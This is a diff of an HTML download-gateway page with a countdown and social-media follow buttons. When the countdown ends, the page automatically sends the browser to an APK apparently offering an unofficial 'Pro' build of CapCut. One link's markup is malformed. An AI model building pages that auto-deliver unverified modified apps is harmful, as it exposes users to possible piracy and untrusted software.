@@ -4,6 +4,7 @@
   <meta charset="UTF-8">
   <title>Preparing Download</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
   <style>
     body{
       background:#020617;
@@ -14,20 +15,89 @@
       justify-content:center;
       height:100vh;
       text-align:center;
+      margin:0;
     }
+
+    .box{
+      max-width:400px;
+      padding:25px;
+      background:#050b18;
+      border-radius:12px;
+    }
+
+    h2{ color:#38bdf8; }
+
+    .count{
+      font-size:20px;
+      margin:10px 0;
+      color:#22c55e;
+      font-weight:bold;
+    }
+
+    /* SOCIAL */
+    .social-follow{
+      margin-top:20px;
+    }
+
+    .social-icons{
+      display:flex;
+      justify-content:center;
+      gap:10px;
+      flex-wrap:wrap;
+    }
+
+    .social-icons a{
+      padding:8px 14px;
+      border-radius:20px;
+      font-size:13px;
+      font-weight:bold;
+      text-decoration:none;
+      color:#fff;
+      transition:0.3s;
+    }
+
+    .yt{ background:#ff0000; }
+    .ig{ background:linear-gradient(45deg,#f9ce34,#ee2a7b,#6228d7); }
+    .fb{ background:#1877f2; }
+
+    .social-icons a:hover{
+      transform:scale(1.08);
+    }
+
   </style>
 </head>
 <body>
 
-<div>
+<div class="box">
   <h2>Preparing your download… ⏳</h2>
-  <p>Please wait 7 seconds</p>
+
+  <p>Please wait</p>
+  <div class="count" id="count">5</div>
+
+  <!-- 🔥 FOLLOW SECTION -->
+  <div class="social-follow">
+    <p>Follow for more updates 👇</p>
+    <div class="social-icons">
+      <a href="https://www.youtube.com/@Tech.WithHussain" target="_blank" class="yt">YouTube</a>
+      <a href="https://www.instagram.com/tech.withhussain/" target="_blank" class="ig">Instagram</a>
+      <a href="https://www.facebook.com/TechWithHussain/="_blank" class="fb">Facebook</a>
+    </div>
+  </div>
 </div>
 
 <script>
-  setTimeout(function(){
-    window.location.href = "https://github.com/mydailytools/my-daily-tools/releases/download/v1.0/CapCut.Pro.Without.VPN.Tech.with.hussain.apk";
-  }, 5000);
+  let time = 5;
+  let countEl = document.getElementById("count");
+
+  let timer = setInterval(() => {
+    time--;
+    countEl.innerText = time;
+
+    if(time <= 0){
+      clearInterval(timer);
+      window.location.href = "https://github.com/mydailytools/my-daily-tools/releases/download/v1.0/CapCut.Pro.Without.VPN.Tech.with.hussain.apk";
+    }
+  },1000);
 </script>
 
 </body>
